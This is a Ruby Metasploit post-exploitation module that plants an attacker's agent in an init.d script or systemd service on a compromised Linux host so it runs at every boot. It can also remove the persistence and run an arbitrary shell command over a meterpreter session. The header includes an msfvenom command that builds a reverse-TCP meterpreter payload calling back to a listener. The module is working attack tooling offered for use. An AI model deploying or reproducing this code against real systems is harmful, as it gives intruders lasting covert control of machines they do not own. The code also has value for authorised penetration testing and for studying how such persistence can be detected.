##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


##
# Exploit Title  : Kali_initd_persistence.rb
# Module Author  : pedr0 Ubuntu [r00t-3xp10it]
# Tested on      : Linux Kali 2.0
# video tutorial : https://www.youtube.com/watch?v=Ag7ufLORbFs
#
#
# [ DESCRIPTION ]
# Builds 'persistance' init.d startup script that allow users to persiste your agent
# (executable) on Linux distros at every startup. This post-module requires the agent
# allready deployed on target system and accepts any 'linux' chmoded agents (elf|sh|py|rb|pl)
# to be auto-executed at startup. This module also accepts shebang agents (eg #!/usr/bin/python)
# and allow users to use 'systemd' (advanced option) as an alternative way to persiste your agent.
# HINT: In Kali distos we are 'root' by default, so this post module does
# not required privilege escalation in systems were we are allready root ..
#
#
# [ MODULE OPTIONS ]
# The session number to run this module on        => set SESSION 3
# The full remote path of binary to execute       => set REMOTE_PATH /root/agent
# Time to wait for the agent to start             => set START_TIME 15
# The full remote path of init.d directory        => set INIT_PATH /etc/init.d
# Delete persistence script/configurations        => set DEL_PERSISTENCE true
# Execute one simple remote bash command          => set SINGLE_COM uname -a
# Use 'systemd' insted of 'init.d' to persiste    => set SYSTEMD true
# The full remote path of systemd directory       => set RPATH_SYSTEMD /etc/systemd/system
# Use agents with shebang? (eg #!/usr/bin/python) => set SHEBANG true
# ---
# If sellected 'SHEBANG true' then agent execution will be based on is shebang
# EXAMPLE: #!/bin/sh agents will be executed         : sh /root/agent.sh
# EXAMPLE: #!/usr/bin/python agents will be executed : python /root/agent.py
# HINT: Rename your agent name to 'agent' when using 'SHEBANG true' option ..
# HINT: This funtion will not support 'SYSTEMD' or 'RPATH_SYSTEMD' options.
# ---
#
#
# [ PORT MODULE TO METASPLOIT DATABASE ]
# Kali linux   COPY TO: /usr/share/metasploit-framework/modules/post/linux/manage/kali_initd_persistence.rb
# Ubuntu linux COPY TO: /opt/metasploit/apps/pro/msf3/modules/post/linux/manage/kali_initd_persistence.rb
# Manually Path Search: root@kali:~# locate modules/post/linux/manage
#
#
# [ BUILD AGENT TO TEST (without-shebang) ]
# msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.67 LPORT=666 -f elf -o agent.elf
#
#
# [ LOAD/USE AUXILIARY ]
# meterpreter > background
# msf exploit(handler) > reload_all
# msf exploit(handler) > use post/linux/manage/kali_initd_persistence
# msf post(kali_initd_persistence) > info
# msf post(kali_initd_persistence) > show options
# msf post(kali_initd_persistence) > show advanced options
# msf post(kali_initd_persistence) > set [option(s)]
# msf post(kali_initd_persistence) > exploit
#
#
# [ HINT ]
# In some linux distributions postgresql needs to be started and
# metasploit database deleted/rebuild to be abble to load module.
# 1 - service postgresql start
# 2 - msfdb reinit   (optional)
# 3 - msfconsole -x 'reload_all'
##




#
# Module Dependencies/requires
#
require 'rex'
require 'msf/core'
require 'msf/core/post/common'



#
# Metasploit Class name and includes
#
class MetasploitModule < Msf::Post
      Rank = GreatRanking

  include Msf::Post::File
  include Msf::Post::Linux::Priv
  include Msf::Post::Linux::System



#
# Building Metasploit/Armitage info GUI/CLI
#
        def initialize(info={})
                super(update_info(info,
                        'Name'          => 'Linux Kali init.d persistence post-module',
                        'Description'   => %q{
                                        Builds 'persistance' init.d startup script that allow users to persiste your agent (executable) on Linux distros at every startup. This post-module requires the agent allready deployed on target system and accepts any 'linux' chmoded agents (elf|sh|py|rb|pl) to be auto-executed at startup. This module also accepts shebang agents (eg #!/usr/bin/python) and allow users to use 'systemd' (advanced option) as an alternative way to persiste your agent.
                        },
                        'License'       => UNKNOWN_LICENSE,
                        'Author'        =>
                                [
                                        'Module Author: pedr0 Ubuntu [r00t-3xp10it]', # post-module author
                                ],
 
                        'Version'        => '$Revision: 1.7',
                        'DisclosureDate' => 'jun 2 2017',
                        'Platform'       => 'linux',
                        'Arch'           => 'x86_x64',
                        'Privileged'     => 'false',   # thats no need for privilege escalation (in-kali) ..
                        'Targets'        =>
                                [
                                         [ 'Linux' ]
                                ],
                        'DefaultTarget'  => '1', # default its to run againts Kali 2.0
                        'References'     =>
                                [
                                         [ 'URL', 'http://goo.gl/ny69NS' ],
                                         [ 'URL', 'http://goo.gl/LZG1LQ' ],
                                         [ 'URL', 'http://goo.gl/281pVK' ],
                                         [ 'URL', 'https://github.com/r00t-3xp10it' ],
                                         [ 'URL', 'https://github.com/r00t-3xp10it/msf-auxiliarys' ]
                                ],
			'DefaultOptions' =>
				{
                                         'SESSION' => '1',             # Default its to run againts session 1
                                         'START_TIME' => '8',          # Default time (sec) to start remote agent
                                         'INIT_PATH' => '/etc/init.d', # Default init.d remote directory full path
                                         'RPATH_SYSTEMD' => '/etc/systemd/system', # Default systemd directory 
				},
                        'SessionTypes'   => [ 'meterpreter' ]
 
                ))
 
                register_options(
                        [
                                OptString.new('SESSION', [ true, 'The session number to run this module on']),
                                OptString.new('START_TIME', [ false, 'Time to wait for the agent to start (in seconds)']),
                                OptString.new('REMOTE_PATH', [ false, 'The full remote path of binary to execute (eg /root/agent)'])
                        ], self.class)

                register_advanced_options(
                        [
                                OptString.new('SINGLE_COM', [ false, 'Execute one simple command (eg uname -a)']),
                                OptBool.new('SHEBANG', [ false, 'Use agents with [shebang]? (eg #!/bin/sh)' , false]),
                                OptBool.new('DEL_PERSISTENCE', [ false, 'Delete persistence script/configurations?' , false]),
                                OptBool.new('SYSTEMD', [ false, 'Use systemd insted of init.d to persiste our agent?' , false]),
                                OptString.new('RPATH_SYSTEMD', [ false, 'The full remote path of systemd directory']),
                                OptString.new('INIT_PATH', [ false, 'The full remote path of init.d directory'])
                        ], self.class) 

        end



#
# Build remote init.d persistence script ..
#
def ls_stage1

  session = client
  rem = session.sys.config.sysinfo
  init = datastore['INIT_PATH']          # /etc/init.d
  stime = datastore['START_TIME']        # 8 (sec to start the agent)
  remote_path = datastore['REMOTE_PATH'] # /root/agent
  script_check = "#{init}/persistance"   # /etc/init.d/persistance
  #
  # check for proper config settings enter
  # to prevent 'unset all' from deleting default options ..
  #
  if datastore['REMOTE_PATH'] == 'nil'
    print_error("Options not configurated correctly ..")
    print_warning("Please set REMOTE_PATH option!")
    return nil
  else
    print_status("Persist: #{remote_path} ..")
    Rex::sleep(1.0)
  end


#
# Use 2º alternative method (systemd service creation)
#
if datastore['SYSTEMD'] == true

  serv_path = datastore['RPATH_SYSTEMD'] #/etc/systemd/system
  serv_file = "#{serv_path}/persistence.service"
    #
    # Check if persistence its allready active ..
    #
    if session.fs.file.exist?(serv_file)
      print_error("systemd: #{serv_file} found ..")
      print_error("Post-module reports that persistence its active ..")
      return nil
    end
    #
    # Check if agent its deployed (remote) ..
    #
    if not session.fs.file.exist?(remote_path)
      print_error("agent: #{remote_path} not found ..")
      print_error("Please upload your agent before running this funtion ..")
      return nil
    end
    print_status("Remote agent full path found ..")

      #
      # This is the systemd script that provides persistence on startup ..
      #
      print_warning("Writing systemd persistence startup script ..")
      Rex::sleep(1.0)

      systemd_data =
      "[Unit]\n" +
      "After=network.target network-online.target\n" +
      "[Service]\n" +
      "ExecStart=#{remote_path}\n" +
      "[Install]\n" +
      "WantedBy=default.target"

      path = "#{serv_file}"
        fd = session.fs.file.new(path, 'wb')
        fd.write(systemd_data)
        fd.close
      print_status("Service path: #{serv_file}")
      Rex::sleep(1.0)

      #
      # Config systemd startup service (chmod + daemon-reload + systemctl enable)
      #
      if session.fs.file.exist?(serv_file)
        print_status("Config systemd persistence script ..")
        cmd_exec("chmod 664 #{serv_file}")
        Rex::sleep(1.0)
        print_status("Reloading systemctl daemon ..")
        cmd_exec("systemctl daemon-reload")
        Rex::sleep(1.0)
        print_status("Enable systemctl service ..")
        cmd_exec("systemctl enable persistence.service")
        Rex::sleep(1.5)
      else
        print_error("systemd script: #{serv_file} not found ..")
        print_error("Persistence on: #{rem['Computer']} not achieved ..")
        return nil
      end


else


    #
    # Check if persistence its allready active ..
    #
    if session.fs.file.exist?(script_check)
      print_error("init.d: #{script_check} found ..")
      print_error("Post-module reports that persistence its active ..")
      return nil
    end
    #
    # Check if agent its deployed (remote) ..
    #
    if not session.fs.file.exist?(remote_path)
      print_error("agent: #{remote_path} not found ..")
      print_error("Please upload your agent before running this funtion ..")
      return nil
    end
    print_status("Remote agent full path found ..")

    #
    # Sellect how agent will execute (in persistence script call)
    #
    if datastore['SHEBANG'] == true
    print_status("Agent with shebang sellected ..")
      #
      # If used agents with SHEBANG (eg #!/usr/bin/python)
      # TODO: Check Extensions execution using bash ( elf | sh | py | rb | pl ) 
      #
      if remote_path =~ /.elf/
        print_status("Agent extension sellected: .elf")
        trigger = "."
      elsif remote_path =~ /.sh/
        print_status("Agent extension sellected: bash")
        trigger = "sh "
      elsif remote_path =~ /.py/
        print_status("Agent extension sellected: python")
        trigger = "python "
      elsif remote_path =~ /.rb/
        print_status("Agent extension sellected: ruby")
        trigger = "ruby "
      elsif remote_path =~ /.pl/
        print_status("Agent extension sellected: perl")
        trigger = "perl "
      else
        print_error("Agent extension not supported ..")
        print_error("Please use [sh|elf|py|rb|pl] agent extensions ..")
        print_error("OR set 'SHELBANG false' to execute agent: ./root/agent")
        return nil
      end
    #
    # WITHOUTH-SHEBANG-AGENTS-EXECUTION (most of venom v1.0.13 builds)
    # Default way to execute one agent shelbang free: ./root/agent
    #
    else
      trigger = "."
    end

      #
      # This is the init.d script that provides persistence on startup ..
      #
      print_warning("Writing init.d persistence startup script ..")
      Rex::sleep(1.0)

      initd_data =
      "#!/bin/sh\n" +
      "### BEGIN INIT INFO\n" +
      "# Provides:          persistence on kali\n" +
      "# Required-Start:    $network $local_fs $remote_fs\n" +
      "# Required-Stop:     $remote_fs $local_fs\n" +
      "# Default-Start:     2 3 4 5\n" +
      "# Default-Stop:      0 1 6\n" +
      "# Short-Description: Persiste your agent in kali linux distros.\n" +
      "# Description:       Allows users to persiste your binary (elf) in kali linux systems\n" +
      "### END INIT INFO\n" +
      "# Give a little time to execute agent\n" +
      "sleep #{stime} > /dev/null\n" +
      "#{trigger}#{remote_path}"

      path = "#{script_check}"
        fd = session.fs.file.new(path, 'wb')
        fd.write(initd_data)
        fd.close
      print_status("Service path: #{script_check}")
      Rex::sleep(1.0)

      #
      # Config init.d startup service (chmod + update-rc.d)
      #
      if session.fs.file.exist?(script_check)
        print_status("Config init.d persistence script ..")
        cmd_exec("chmod 755 #{script_check}")
        Rex::sleep(1.0)
        print_status("Update init.d service status (symlinks) ..")
        # update-rc.d persistance defaults # 97 03
        cmd_exec("update-rc.d persistance defaults")
        Rex::sleep(1.5)
      else
        print_error("init.d script: #{script_check} not found ..")
        print_error("Persistence on: #{rem['Computer']} not achieved ..")
        return nil
      end

end

    #
    # Final displays to user ..
    #
    if datastore['SYSTEMD'] == true
      print_good("Persistence achieved on: #{rem['Computer']}")
      Rex::sleep(1.0)
      print_warning("To start service: systemctl start persistence.service")
      Rex::sleep(1.0)
    else
      print_good("Persistence achieved on: #{rem['Computer']}")
      Rex::sleep(1.0)
    end

  #
  # error exception funtion
  #
  rescue ::Exception => e
  print_error("Error: #{e.class} #{e}")
end





#
# Delete init.d script and confs ..
#
def ls_stage2

  session = client
  rem = session.sys.config.sysinfo
  init = datastore['INIT_PATH']        # /etc/init.d
  script_check = "#{init}/persistance" # /etc/init.d/persistance
  #
  # check for proper config settings enter
  # to prevent 'unset all' from deleting default options ..
  #
  if datastore['DEL_PERSISTENCE'] == 'nil'
    print_error("Options not configurated correctly ..")
    print_warning("Please set DEL_PERSISTENCE option!")
    return nil
  else
    print_status("Delete startup persistence script ..")
    Rex::sleep(1.0)
  end


#
# Use 2º alternative method (systemd service creation)
#
if datastore['SYSTEMD'] == true

  serv_path = datastore['RPATH_SYSTEMD'] #/etc/systemd/system
  serv_file = "#{serv_path}/persistence.service"
    #
    # Check systemd persiste script existance ..
    #
    if not session.fs.file.exist?(serv_file)
      print_error("script: #{serv_file} not found ..")
      print_error("Post-module reports that none persistence was found ..")
      return nil
    end
    print_status("Persistence script full path found ..")

      #
      # Delete systemd script ..
      #
      print_status("Removing script from systemd directory ..")
      cmd_exec("rm -f #{serv_file}")
      Rex::sleep(1.0)
      print_status("Reloading systemctl daemon process ..")
      cmd_exec("sudo systemctl daemon-reload")
      Rex::sleep(1.5)

    #
    # Check systemd persiste script existance (after delete) ..
    #
    if session.fs.file.exist?(serv_file)
      print_error("script: #{serv_file} not proper deleted ..")
      print_error("Please manually delete : rm -f #{serv_file}")
      print_error("Please manually execute: sudo systemctl daemon-reload")
      return nil
    end


else


    #
    # Check init.d persiste script existance ..
    #
    if not session.fs.file.exist?(script_check)
      print_error("script: #{script_check} not found ..")
      print_error("Post-module reports that none persistence was found ..")
      return nil
    end
    print_status("Persistence script full path found ..")

      #
      # Delete init.d script ..
      #
      print_status("Deleting persistence service (symlinks) ..")
      cmd_exec("update-rc.d persistance remove")
      Rex::sleep(1.5)
      print_status("Removing script from init.d directory ..")
      cmd_exec("rm -f #{script_check}")
      Rex::sleep(1.0)

    #
    # Check init.d persiste script existance (after delete) ..
    #
    if session.fs.file.exist?(script_check)
      print_error("script: #{script_check} not proper deleted ..")
      print_error("Please manually delete : rm -f #{init}/persistance")
      print_error("Please manually execute: update-rc.d persistance remove")
      return nil
    end

end

    #
    # Final displays to user ..
    #
    print_good("Persistence deleted from: #{rem['Computer']}")
    print_warning("This module will NOT delete the agent from target ..")
    Rex::sleep(1.0)

  #
  # error exception funtion
  #
  rescue ::Exception => e
  print_error("Error: #{e.class} #{e}")
end




#
# Execute single_command (shell) and return output ..
#
def ls_stage3

  session = client
  rem = session.sys.config.sysinfo
  exe_com = datastore['SINGLE_COM']  # uname -a
  #
  # check for proper config settings enter
  # to prevent 'unset all' from deleting default options ..
  #
  if datastore['SINGLE_COM'] == 'nil'
    print_error("Options not configurated correctly ..")
    print_warning("Please set SINGLE_COM option!")
    return nil
  else
    print_status("Executing remote bash command  ..")
    Rex::sleep(1.0)
  end

      #
      # msf API call to execute bash command remotelly  ..
      #
      print_good("Executing: #{exe_com}")
      Rex::sleep(1.0)
      output = cmd_exec("#{exe_com}")
      print_line("")
      print_line(output)
      print_line("")

  #
  # error exception funtion
  #
  rescue ::Exception => e
  print_error("Error: #{e.class} #{e}")
end




#
# MAIN DISPLAY WINDOWS (ALL MODULES - def run)
# Running sellected modules against session target
#
def run
  session = client

      # Variable declarations (msf API calls)
      sysnfo = session.sys.config.sysinfo
      runtor = client.sys.config.getuid
      runsession = client.session_host
      directory = client.fs.dir.pwd

    # Print banner and scan results on screen
    print_line("    +---------------------------------------------+")
    print_line("    |  Kali Linux init.d persistence post-module  |")
    print_line("    |            Author : r00t-3xp10it            |")
    print_line("    +---------------------------------------------+")
    print_line("")
    print_line("    Running on session  : #{datastore['SESSION']}")
    print_line("    Target Architecture : #{sysnfo['Architecture']}")
    print_line("    Computer            : #{sysnfo['Computer']}")
    print_line("    Target IP addr      : #{runsession}")
    print_line("    Operative System    : #{sysnfo['OS']}")
    print_line("    Payload directory   : #{directory}")
    print_line("    Client UID          : #{runtor}")
    print_line("")
    print_line("")


    #
    # the 'def check()' funtion that rapid7 requires to accept new modules.
    # Guidelines for Accepting Modules and Enhancements:https://goo.gl/OQ6HEE
    #
    # check for proper operative system (Linux)
    #
    if not sysinfo['OS'] =~ /Linux/
      print_error("[ABORT]: This module only works againt Linux systems")
      return nil
    end
    #
    # Check if we are running in an higth integrity context (root)
    #
    unless runtor =~ /uid=0/ || runtor =~ /root/
      print_error("[ABORT]: Root access is required in non-Kali distros ..")
      return nil
    end
    #
    # check for proper session (meterpreter)
    # the non-return of sysinfo command reveals that we are not on a meterpreter session!
    #
    if not sysinfo.nil?
      print_warning("Running module against: #{sysnfo['Computer']}")
    else
      print_error("[ABORT]: This module only works in meterpreter sessions!")
      return nil
    end


#
# Selected settings to run
#
      if datastore['REMOTE_PATH']
         ls_stage1
      end

      if datastore['DEL_PERSISTENCE']
         ls_stage2
      end

      if datastore['SINGLE_COM']
         ls_stage3
      end

   end
end
